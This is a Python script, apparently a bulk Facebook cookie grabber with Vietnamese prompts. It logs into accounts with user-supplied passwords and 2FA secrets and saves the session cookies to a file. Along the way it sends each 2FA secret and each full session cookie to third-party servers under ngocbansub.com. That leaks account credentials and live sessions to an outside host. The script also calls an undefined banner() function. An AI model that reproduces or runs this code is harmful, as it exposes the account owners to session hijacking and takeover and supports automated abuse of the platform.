import mechanize, requests, json
import os, json, sys, requests 

banner()
class Get_Cookie_Facebook:
	def __init__(self):
		self.browser = mechanize.Browser()
		self.browser.set_handle_robots(False)
		self.browser.addheaders = [('User-agent', 'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30')]

	def Get_Cookie_2FA(self, user, password, _2FA):
		try:
			self.browser.addheaders = [('User-agent', 'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30')]
			code = requests.get(f'https://sever.ngocbansub.com/toolmoi/api_php_by_ngoc/2FA.php?2fa={_2FA}').json()['code']
			self.browser.open('https://mbasic.facebook.com/login.php')
			self.browser.select_form(nr=0)
			self.browser.form['email'] = user
			self.browser.form['pass'] = password
			self.browser.submit()
			try:
				self.browser.open(f'https://mbasic.facebook.com/checkpoint/?__req')
				self.browser._factory.is_html = True
				self.browser.select_form(nr=0)
				self.browser.form['approvals_code'] = code
				self.browser.submit()
				self.browser.open('https://mbasic.facebook.com/login/checkpoint/')
				self.browser._factory.is_html = True
				self.browser.select_form(nr=0)
				self.browser.submit()
			except:pass
			self.browser.open('https://mbasic.facebook.com/home.php')
			self.browser._factory.is_html = True
			cookies = requests.utils.dict_from_cookiejar(self.browser.cookiejar)
			self.cookie = '; '.join(f'{key}={value}' for key, value in cookies.items())
			data = {'cookie':self.cookie}
			
			self.user_id = self.cookie.split('c_user=')[1].split(';')[0]
			response = requests.post('http://api.ngocbansub.com/api_fb2.php/?fields=profile',data = data, timeout=20 ).json()
			if response['status'] == 'success':
				self.fb_dtsg = response['fb_dtsg']
				self.jazoest = response['jazoest']
				self.ten = response['name']
				print(self.ten)
				print(self.cookie)
				return self.cookie
			else:
				return False
		except:
			return False
l = []
filee = input ('Nhập File Muốn Lưu Cookie : ')
so = int(input ('Muốn Lấy Cookie Mấy Acc : '))
for i in range(1, so+1):
	l.append([input (f'Nhập TK NICK Thứ {i}: '), input (f'Nhập MK NICK Thứ {i}: '),input (f'Nhập 2FA Thứ [không có enter bỏ qua] {i}: ') ])

for j in l:
	user = j[0]
	password = j[1]
	_2FA = j[2]
	a = Get_Cookie_Facebook().Get_Cookie_2FA(user, password, _2FA)
	if a != False:
		with open(filee, 'a') as file:
			file.write(a+'\n')
	else:
		print('Khong Get Duoc Cookie')
    